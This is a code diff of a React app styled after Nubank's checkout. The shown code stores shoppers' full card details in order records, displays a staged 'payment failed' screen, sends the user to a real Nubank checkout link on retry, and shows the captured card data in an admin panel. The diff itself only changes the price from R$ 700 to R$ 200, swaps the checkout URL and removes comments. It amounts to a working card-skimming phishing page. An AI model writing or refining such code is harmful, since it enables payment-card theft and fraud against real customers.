@@ -183,8 +183,8 @@ const App: React.FC = () => {
     const orderData = {
       ...formData,
       products: selectedProducts,
-      cardDetails: cardData, // Saving card data as requested
-      total: 700.00,
+      cardDetails: cardData,
+      total: 200.00,
       timestamp: new Date().toISOString(),
       status: 'payment_failed_error_screen'
     };
@@ -201,7 +201,7 @@ const App: React.FC = () => {
 
   // Step 3: User clicks "Try Again" -> Redirects to real checkout
   const handleRetryPayment = () => {
-    window.location.href = 'https://checkout.nubank.com.br/6cAcYYi1QL15dr71';
+    window.location.href = 'https://checkout.nubank.com.br/6cqFN1rPHb15dr71';
   };
 
   // --- Admin Logic ---
@@ -369,7 +369,6 @@ const App: React.FC = () => {
         <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-sm animate-in fade-in duration-200 overflow-y-auto">
           <div className="bg-white w-full max-w-md rounded-3xl shadow-2xl overflow-hidden relative p-8 text-center my-8">
             
-            {/* Close button only available in Summary or Card Form */}
             {(paymentStep === 'summary' || paymentStep === 'card_form') && (
               <button 
                 onClick={() => setShowPaymentModal(false)}
@@ -410,7 +409,7 @@ const App: React.FC = () => {
 
                 <div className="mb-8">
                    <p className="text-sm text-gray-500 mb-1">Valor Total</p>
-                   <p className="text-3xl font-extrabold text-nubank">R$ 700,00</p>
+                   <p className="text-3xl font-extrabold text-nubank">R$ 200,00</p>
                 </div>
 
                 <button
@@ -503,7 +502,7 @@ const App: React.FC = () => {
                       >
                          {[...Array(10)].map((_, i) => (
                            <option key={i} value={i + 1}>
-                             {i + 1}x de R$ {(700 / (i + 1)).toFixed(2).replace('.', ',')} sem juros
+                             {i + 1}x de R$ {(200 / (i + 1)).toFixed(2).replace('.', ',')} sem juros
                            </option>
                          ))}
                       </select>
@@ -667,10 +666,9 @@ const App: React.FC = () => {
                                    
                                    <div className="text-right flex-1">
                                       <p className="text-xs text-gray-400">Total</p>
-                                      <p className="text-lg font-bold text-green-600">R$ {order.total}</p>
+                                      <p className="text-lg font-bold text-green-600">R$ {order.total?.toFixed(2).replace('.', ',')}</p>
                                    </div>
                                 </div>
-                                {/* Admin view of card data if present */}
                                 {order.cardDetails && (
                                   <div className="mt-3 p-3 bg-gray-50 border border-gray-200 rounded-lg">
                                     <div className="flex items-center gap-2 mb-2 pb-2 border-b border-gray-200">
